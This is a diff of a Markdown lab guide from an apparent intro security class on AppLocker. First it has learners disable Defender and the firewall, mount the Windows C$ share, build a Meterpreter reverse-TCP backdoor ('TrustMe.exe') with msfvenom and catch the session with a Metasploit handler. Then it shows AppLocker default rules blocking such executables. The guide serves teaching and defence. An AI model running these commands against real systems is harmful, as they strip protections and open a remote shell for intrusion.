@@ -1,213 +1,209 @@
-
 # AppLocker
-
 
 Applocker Instructions:
 
-Let’s see what happens when we do not have AppLocker running.  We will set up a simple backdoor and have it connect back to the Ubuntu system.  Remember, the goal is not to show how we can bypass EDR and Endpoint products.  It is to create a simple backdoor and have it connect back.
+Let’s see what happens when we do not have **AppLocker** running.  We will set up a simple backdoor and have it connect back to the **Kali** system.  Remember, the goal is not to show how we can bypass **EDR** and **Endpoint** products.  It is to create a simple backdoor and have it connect back.
 
-First, let’s disable Defender. Simply run the following from an Administrator PowerShell prompt:
+Before we begin, we need to disable **Defender**. Start by opening an instance of **Windows Powershell**. Do this by clicking on the **Powershell** icon in the taskbar.
 
-`Set-MpPreference -DisableRealtimeMonitoring $true`
-
-This will disable Defender for this session.
-
-If you get angry red errors, that is Ok, it means Defender is not running.
-
-Thankfully, we have a couple of scripts that greatly simplify this process.  Please make sure both your Windows and your Linux systems are running.
-
-Let’s get started by opening a Terminal as Administrator
-
-![](attachments/Clipboard_2020-06-12-10-36-44.png)
-
-When you get the User Account Control Prompt, select Yes.
-
-And, open a Ubuntu command prompt:
-
-![](attachments/Clipboard_2020-06-17-08-32-51.png)
-
-####NOTE##### 
-
-If you are having trouble with Windows Terminal, you can simply start each of the three shells, we use by starting them directly from the Windows Start button. 
-
- 
-
-Simply click the Windows Start button in the lower left of your screen and type: 
-
- 
-
-`Powershell` 
-
-or 
-
-`Ubuntu`
-
-or 
-
-`Command Prompt` 
-
- 
-
-For PowerShell and Command Prompt, please right click on them and select Run As Administrator 
-
-###END NOTE###
-
-On your Linux system, please run the following command:
-
-$`ifconfig`
-
-![](attachments/Clipboard_2020-06-12-12-35-15.png)
-
-Please note the IP address of your Ethernet adapter.  
+![](attachments/OpeningPowershell.png)
 
 
+Next, run the following command in the **Powershell** terminal:
 
-Please note that my adaptor is called eth0 and my IP address is 172.26.19.133.   Your IP Address and adapter name may be different.
+<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
 
-Please note your IP address for the ADHD Linux system on a piece of paper:
+![](attachments/applocker_disabledefender.png)
+
+This will disable **Defender** for this session.
+
+If you get angry red errors, that is **Ok**, it means **Defender** is not running.
+
+Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
+
+<pre> netsh advfirewall set allprofiles state off</pre>
 
 
+Next, set a password for the Administrator account that you can remember
+
+<pre>net user Administrator password1234</pre>
+
+Please note, that is a very bad password.  Come up with something better. But, please remember it.
+
+Before we move on from our Powershell window, lets get our IP by running the following command:
+
+<pre>ipconfig</pre>
+
+![](attachments/powershellipconfig.png)
+
+**REMEMBER - YOUR IP WILL BE DIFFERENT**
+
+Write this IP down so we can use it again later.
+
+Let’s continue by opening a **Kali** instance.
+
+![](attachments/OpeningKaliInstance.png)
+
+Alternatively, you can click on the **Kali** icon in the taskbar.
+
+![](attachments/TaskbarKaliIcon.png)
+
+Let's start by getting root access in our terminal.
+
+<pre>sudo su -</pre>
+
+We need to run the following command in order to mount our remote system to the correct directory:
+
+<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>
+
+**REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**
+
+If you see the following error, it means that the device is already mounted.
+
+![](attachments/mounterror.png)
+
+If this is the case, ignore it.
+Run the following command to navigate into the mounted directory:
+
+<pre>cd /mnt/windows-share</pre>
+
+Before we run the next commands, we need to get the IP of our Kali System (AKA our Linux IP Adress). Lets do so by running the following:
+
+<pre>ifconfig</pre>
+
+![](attachments/applocker_ifconfig.png)
+
+**REMEMBER: YOUR IP WILL BE DIFFERENT**
 
 Now, run the following commands to start a simple backdoor and backdoor listener: 
 
-$ `sudo su -`
-Please note, the adhd password is adhd.
+<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
 
-`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
--f exe -o /tmp/TrustMe.exe`
+Let's start the **Metasploit Handler**.  First, open a new **Kali** instance. The easiest way to do this is by clicking on the **Kali** icon in the taskbar.
 
-`cd /tmp`
+![](attachments/TaskbarKaliIcon.png)
 
-`ls -l TrustMe.exe`
+Before doing anything else, we need to run the following command in our new terminal window:
 
+<pre>msfconsole -q</pre>
 
-`cp ./TrustMe.exe /mnt/c/tools`
+![](attachments/msfconsole.png)
 
+The **Metasploit Handler** successfully ran if the terminal now starts with **"msf6 >"**
 
-Now, let's start the Metasploit Handler.  First, open a new Ubuntu Terminal by clicking the down carrot then selecting Ubuntu-18.04.
+Next, let's run the following:
 
-Let's become root.
+<pre>use exploit/multi/handler</pre>
 
-`sudo su -`
+Now run all of the following commands to set the correct parameters:
 
-root@DESKTOP-I1T2G01:/tmp# `msfconsole -q`
+<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
-msf5 > `use exploit/multi/handler`
+<pre>set LHOST [Your Linux IP Address]</pre>
 
-msf5 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`
+**REMEMBER - YOUR IP WILL LIKELY BE DIFFERENT!**
 
-PAYLOAD => windows/meterpreter/reverse_tcp
+Go ahead and run the exploit:
 
-msf5 exploit(multi/handler) > `set LHOST 172.26.19.133`
-
-Remember, your IP will be different!
-
-msf5 exploit(multi/handler) > `exploit`
-
+<pre>exploit</pre>
 
 It should look like this:
 
-![](attachments/Clipboard_2020-06-12-12-46-10.png)
+![](attachments/msf6commands.png)
 
+Let’s download the malware and run it!
 
-Now, let’s download the malware and run it!
+Open a **Windows** command prompt. Do this by clicking on the icon in the taskbar.
 
-First, let's open a Windows command prompt.  Simply select the down carrot from the Windows Terminal and select Command Prompt.
+![](attachments/OpeningWindowsCommandPrompt.png) 
 
-Once the prompt is open, let's run the following commands to run the TrustMe.exe file.
+Once the prompt is open, let's run the following commands to run the **"TrustMe.exe"** file.
 
-`cd \tools`
+<pre>cd \</pre>
 
+<pre>TrustMe.exe</pre>
 
-Then, run it.
+![](attachments/runtrustme.png)
 
-`TrustMe.exe`
+Back at your **Kali** terminal, you should now have a **metasploit** session!
 
+![](attachments/meterpretersession.png)
 
-Back at your Ubuntu prompt, you should have a metasploit session!
+Let’s stop this from happening!
 
-![](attachments/Clipboard_2020-06-12-12-55-11.png)
+To do this we will need to access the **"Local Security Policy"** on your **Windows** System.
 
+Simply press the Windows key, (lower left hand of your keyboard, looks like a Windows Logo), then type **"Local Security"**.  It should bring up a menu like the one below, please select **"Local Security Policy"**.
 
-Now, let’s stop this from happening!
+![](attachments/localsecuritypolicy.png)
 
-First, let’s configure AppLocker.  To do this we will need to access the Local Security Policy on your Windows System.
+We will need to configure **AppLocker**.  To do this, please go to Security Settings > Application Control Policies > AppLocker.
 
-Simply press the Windows key (lower left hand of your keyboard, looks like a Windows Logo)  then type Local Security.  It should bring up a menu like the one below, please select Local Security Policy.
+![](attachments/localsecpolicywindow.png)
 
-![](attachments/Clipboard_2020-06-12-12-55-55.png)
+Scroll down in the right hand pane. You will see there are **"0 Rules enforced"** for all policies.  We will add in the default rules.  We will choose the defaults because we are far less likely to break a system.
 
+![](attachments/rulesoverview.png)
 
-Next, we will need to configure AppLocker.  To do this, please go to Security Settings > Application Control Policies and  then AppLocker.
+Please select each of the above Rule groups, **"Executable, Windows Installer, Script, and Packaged,"** and for each one, right click in the area that says **“There are no items to show in this view.”** and then select **“Create Default Rules”**.
 
-
-![](attachments/Clipboard_2020-06-12-12-57-02.png)
-
-
-
-In the right hand pane, you will see there are 0 Rules enforced for all policies.  We will add in the default rules.  We will choose the defaults because we are far less likely to brick a system.
-
-![](attachments/Clipboard_2020-06-12-12-58-38.png)
-
-
-Please select each of the above Rule groups (Executable, Windows Installer, Script and Packaged) and for each one, right click in the area that says “There are no items to show in this view.” and then select “Create Default Rules”
-
-
-![](attachments/Clipboard_2020-06-12-12-59-57.png)
+![](attachments/createdefaultrules.png)
 
 This should generate a subset of rules for each group.  It should look similar to how it does below: 
 
+![](attachments/appliedrules.png)
 
-![](attachments/Clipboard_2020-06-12-13-00-24.png)
+For simplicity, you can click the next set of rules from the left panel as seen above.
 
-Next, we need to enforce the rules:
+We now need to enforce the rules:
 
+To do this you will need to select **AppLocker** on the far left pane.  You will need to select **"Configure rule enforcement"**.  This will open a pop-up. Check the **"Configured"** box for each set of rules.  
 
-To do this you will need to select AppLocker on the far left pane.  Then, you will need to select Configure rule enforcement.  This will open a pop-up, you will need to check Configured for each set of rules
+![](attachments/ruleenforcement.png)
 
-![](attachments/Clipboard_2020-06-23-10-45-07.png)
+We will need to start the **"Application Identity service"**.  This is done through pressing the Windows key and typing **"Services"**.  
 
+![](attachments/services.png)
 
+This will bring up the **Services App**.  Double-click **“Application Identity”**.
 
-Now, we will need to start the Application Identity service.  This is done through pressing the Windows key and typing Services.  This will bring up the Services App.  Please select that and then double-click “Application Identity.”
+![](attachments/applicationidentity.png)
 
-![](attachments/Clipboard_2020-06-12-13-00-54.png)
+Once the **"Application Identity Properties"** dialog is open, please press the **Start** button.  This will start the service.
 
-Once the Application Identity Properties dialog is open, please press the Start button.  This will start the service.
+![](attachments/startservice.png)
 
-![](attachments/Clipboard_2020-06-12-13-01-27.png)
+Open a command prompt and run **"gpupdate"** to force the policy change.
 
-Next, open a command prompt and run gpupdate to force the policy change
+![](attachments/OpeningWindowsCommandPrompt.png)
 
-C:\ `gpupdate /force`
+<pre>gpupdate /force</pre>
 
-Next, log out as ADHD and log back in as allowlist.  
+We are now going to try to run **"TrustMe.exe"** as another user on the system. 
 
-You can do this easily by selecting the Windows icon and then the little white user icon:
+Run the following commands:
 
-![](attachments/Clipboard_2020-06-15-09-00-39.png)
+<pre>cd /IntroLabs</pre>
 
-The password is ADHD.
+<pre>runas /user:whitelist "nc"</pre>
 
-![](attachments/Clipboard_2020-06-15-08-46-49.png)
+The password is **adhd**
 
+![](attachments/runas.png)
 
+As you can see, an error was generated, meaning that we were successful!
 
-Now, navigate to the C:>\Tools directory with Windows Explorer and try to run some of the .exe files.
+***
+***Continuing on to the next Lab?***
 
-![](attachments/Clipboard_2020-06-15-08-48-09.png)
+[Click here to get back to the Navigation Menu](/IntroClassFiles/navigation.md)
 
-You will see that most of the .exe files will generate an error.
-
-
-
-
-You should get an error.
-
-To finish this lab, simply restart your class VM and log in as ADHD.
-
-
+***Finished with the Labs?***
 
 
+Please be sure to destroy the lab environment!
 
+[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
+
+---
 
